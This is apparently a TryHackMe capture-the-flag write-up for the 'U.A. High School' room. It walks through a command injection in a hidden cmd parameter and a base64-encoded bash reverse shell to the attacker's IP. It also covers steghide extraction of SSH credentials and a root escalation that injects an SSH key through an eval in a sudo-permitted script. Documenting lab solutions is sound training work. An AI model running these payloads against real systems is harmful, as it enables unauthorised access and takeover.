---
title: 'U.A. High School'
description: 'RCE through a hidden command injection parameter, finding credetials with steghide on an image and privilege escalation through a bash script with sudo permissions'
pubDate: 2024-08-25
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/11c2b861cb1add6468a32d0be7b26b44.png'
---

The pages all appear to be static HTML, also the contact form doesn't post anywhere.
I noticed at some point that a `PHPSESSID` cookie was set, it seems that this is the only part that is dynamic.

Messing around with it I luckily guessed some hidden functionality.

Doing a GET on this path with the `cmd` param seems to execute the given value, for example:

```
GET /assets/?cmd=id HTTP/1.1
...[snip]...
```

Returns:
```
...[snip]...
Set-Cookie: PHPSESSID=kjnnvdtmnva7bdobv6murgdkrv; path=/
...[snip]...
Content-Type: text/html; charset=UTF-8

dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

The base64 string is the value from the `id` command.
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now to get a shell we can use this GET request:

```
GET /assets/?cmd=echo+YmFzaCAgIC1pID4mIC9kZXYvdGNwLzEwLjguMTE5LjEzNy80NDQ0IDA%2bJjEK|base64+-d|bash
...[snip]...
```

## USER

If we look around in the `/var/www` folder we find some interesting things, first there is a `Hidden_Content` folder with a passphrase file in it:

```bash
cat /var/www/Hidden_Content/passphrase.txt | base64 -d
AllmightForEver!!!
```

There is also a 'broken' image in the `/var/www/html/assets/images` folder, it appears to be broken but lets get it and check it out.

```bash
wget http://10.10.98.57/assets/images/oneforall.jpg
```

I suspect this has some Stego, so lets run `steghide` on the file

```bash
steghide info oneforall.jpg
steghide: the file format of the file "oneforall.jpg" is not supported.
```

When opening the file in a text or hexeditor we see that it has the magic bytes for a PNG but it has the JPG extension.

If we edit the `oneforall.jpg` in an hexeditor to match the the first 3 blocks with the other JPG file (`yuei.jpg`) we can actually view the JPG file.

The first 3 blocks should be: `FF D8 FF E0  00 10 4A 46  49 46 00 01`.

Now lets check `steghide` again:

```bash
steghide info oneforall.jpg -p 'AllmightForEver!!!'
"oneforall-mod.jpg":
  format: jpeg
  capacity: 5.4 KB
  embedded file "creds.txt":
    size: 150.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Lets extract the `creds.txt` file:

```bash
steghide extract -sf oneforall-mod.jpg -p 'AllmightForEver!!!'
wrote extracted data to "creds.txt".
```

In the `creds.txt` file we find the credentials for the `deku` user. We can use these credentials to SSH in to the target:

```
deku:One?For?All_!!one1/A
```

## ROOT

When we check our sudo permissions we find an interesting file:

```bash
sudo -l
[sudo] password for deku:
Matching Defaults entries for deku on myheroacademia:
...[snip]...
    (ALL) /opt/NewComponent/feedback.sh
```

The `feedback.sh` script is filtering out a lot of special characters, but one that is missing is the forward slash (`/`).

`feedback.sh` file:
```bash
...[snip]...
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

So we can make use of the scripts `echo` command and add our public SSH key to the `authorized_keys`.

Generate a small SSH key:
```bash
ssh-keygen -t ed25519 -f ex-it
...[snip]...
cat ex-it.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8KXWD7ITYKV1vrlwqUuYwFOMZPkDApztK8c1uhWSdc ex-it@kali
```

Injecting it into the script:
```bash
sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8KXWD7ITYKV1vrlwqUuYwFOMZPkDApztK8c1uhWSdc ex-it@kali >> /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.
```

Now we can SSH as root in to the target.

```bash
ssh -i root root@10.10.98.57
```
